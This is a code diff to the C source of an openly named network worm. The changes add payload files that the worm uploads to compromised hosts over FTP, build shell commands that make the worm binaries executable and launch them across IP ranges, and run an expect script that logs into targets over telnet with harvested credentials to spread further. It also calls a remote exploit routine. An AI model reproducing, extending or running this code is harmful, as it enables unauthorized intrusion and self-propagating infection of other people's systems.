@@ -9,7 +9,7 @@
 #include "spread.h"
 
 #ifndef FTP_USER
-#  define FTP_USER            "rrlm"
+#  define FTP_USER            "usuario"
 #endif
 
 struct bruteforce_arguments {
@@ -143,7 +143,13 @@ int main(int argc, char *const *argv) {
         }
 
         strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
-        length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
+
+        length = snprintf(cmd_buffer, sizeof cmd_buffer,
+                  "chmod +x ~%s/worm* ; "
+                  "~%s/worm %s 1-1024 ; "
+                  "~%s/worm.i686 %s 1-1024\n", 
+                  FTP_USER, FTP_USER, range, FTP_USER, range);
+
         fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
 
         if((method = rand() % 1) == 0) {
@@ -166,10 +172,17 @@ int main(int argc, char *const *argv) {
             spread(ftp_fd, "worm", "worm");
             spread(ftp_fd, "worm.i686", "worm.i686");
             spread(ftp_fd, "worm.expect", "worm.expect");
+            spread(ftp_fd, "worm.expect.i686", "worm.expect.i686");
+            spread(ftp_fd, "worm.telnet", "worm.telnet");
             close(ftp_fd);
           }
 
-          length = snprintf(telnet_buffer, sizeof telnet_buffer, "./worm.expect %s 23 %s %s %s 1-1024\n", target->address, FTP_USER, ftp_password, range);
+          length = snprintf(telnet_buffer, sizeof telnet_buffer,
+                    "./worm.expect worm.telnet %s 23 %s %s %s 1-1024 ; "
+                    "./worm.expect.i686 worm.telnet %s 23 %s %s %s 1-1024\n",
+                    target->address, FTP_USER, ftp_password, range,
+                    target->address, FTP_USER, ftp_password, range);
+
           system(telnet_buffer);
         } else {
           shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
